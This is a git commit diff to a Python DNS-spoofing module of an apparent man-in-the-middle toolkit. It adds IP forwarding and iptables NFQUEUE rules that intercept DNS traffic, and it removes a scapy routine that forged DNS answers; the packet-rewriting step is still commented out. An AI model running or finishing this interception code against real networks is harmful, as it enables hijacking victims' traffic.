1e6f2e889e1e751b80f6ab05efad61211e8d0e3e
yoonjungjun0202 <love667@naver.com>
2017-10-23 17:46:04 -0400

    Add NetfilterQueue

--- DnsSpoofing.py
+++ DnsSpoofing.py
@@ -1,30 +1,96 @@
 from CommandModule import *
 from scapy.all import *
+from SSLStrip import NetSetup
+from netfilterqueue import NetfilterQueue
 
 class DnsSpoofing(CommandModule) :
     command = "dns"
     outline = "--"
     manual = "--"
+    nfqueue = {}
+
+
+    def getNFQueue(self, num) :
+        if None == self.nfqueue.get(num) :
+            self.nfqueue[num] = NetfilterQueue()
+        return self.nfqueue[num]
+	
 
     def run(self) :
-        print("THIS IS DNS-SPOOFING")
-        while True :
-            f()
-        sniff(filter="udp dst port 53 and ip src 192.168.43.130", prn=f())
+        if False == NetSetup.getInstance().checkIpForward() :
+            NetSetup.getInstance().ipForward()
 
-def f() :
-    r = sr1(IP(src="192.168.43.1", dst="192.168.43.130")/UDP(dport=53)
-        /DNS(qd=DNSQR(qname="www.google.com", qtype="A"), qr=1, aa=1, ancount=1, qdcount=1,
-        an=DNSRR(rrname="www.google.com", type="A", ttl=0, rdata="")))
-    # r = sr1(
-    #     IP(src="192.168.43.1", dst="8.8.8.8")
-    #     /
-    #     UDP()
-    #     /
-    #     DNS(opcode=5,qd=[DNSQR(qname="web1.jtj.kr", qtype="A")],ns=[DNSRR(rrname="web1.jtj.kr", type="A",ttl=0,rdata="")]),
-    #     verbose=0,timeout=5
-    # )
-    print(r)
+
+        # This rule of iptables can make a packet which is modifiable.
+        queryID = 1
+        checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
+        iptablesOpt = "-t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
+        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
+            NetSetup.getInstance().ipTables(iptablesOpt)
+
+        responseID = 2
+        checkOpt = "\"udp spt:53 NFQUEUE num " + str(responseID) + "\""
+        iptablesOpt = "-t nat -A PREROUTING -p udp --sport 53 -j NFQUEUE --queue-num " + str(responseID)
+        if False == NetSetup.getInstance().checkIpTables(checkOpt) :
+            NetSetup.getInstance().ipTables(iptablesOpt)
+        # iptablesOpt = "-I INPUT -d 192.168.0.8/24 -j NFQUEUE --queue-num " + str(responseID)
+        # NetSetup.getInstance().ipTables(iptablesOpt)
+
+
+        # DNS-Spoofing
+        print("# DNS cache poisoning...")
+        # sniff(lfilter=lambda x: x.haslayer(DNS), prn=processDns)
+        try :
+            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback)
+            self.getNFQueue(responseID).bind(responseID, self.dnsResponseCallback)
+            self.getNFQueue(queryID).run()
+            self.getNFQueue(responseID).run()
+        except KeyboardInterrupt :
+            self.getNFQueue(queryID).unbind()
+            self.getNFQueue(responseID).unbind()
+	
+
+    def dnsQueryCallback(self, packet) :
+        # pkt = IP(packet.get_payload)
+        # packet.set_payload(str(pkt))
+        print(packet)
+        packet.accept()
+        pass
+
+
+    def dnsResponseCallback(self, packet) :
+        # pkt = IP(packet.get_payload)
+        # packet.set_payload(str(pkt))
+        packet.accept()
+        print(packet)
+        pass
+
+
+"""
+# scapy.layers.dns
+# scapy.packet.Packet = packet
+def processDns(packet) :
+    # DNSQR : DNS Question Record
+    if DNSQR in packet and packet.dport == 53 :
+	    print("# queries...")
+    # DNSRR : DNS Resource Record
+    elif DNSRR in packet and packet.sport == 53 :
+        print("# response...")
+        payload = IP(packet.get_payload())
+    else :
+        print("It is not a DNS packet")
+        pass
+
+    if IP in pkt :
+        ip_src = pkt[IP].src
+        ip_dst = pkt[IP].dst
+        if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 :
+            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(pkt.getlayer(DNS).qd.qname) + ")")
+        elif pkt.haslayer(DNS) and pkt.getlayer(DNS).rr == 0 :
+            print(str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + str(pkt.getlayer(DNS).qd.qname) + ")")
+
+"""
+
 
 if __name__ == '__main__' :
     a = DnsSpoofing()
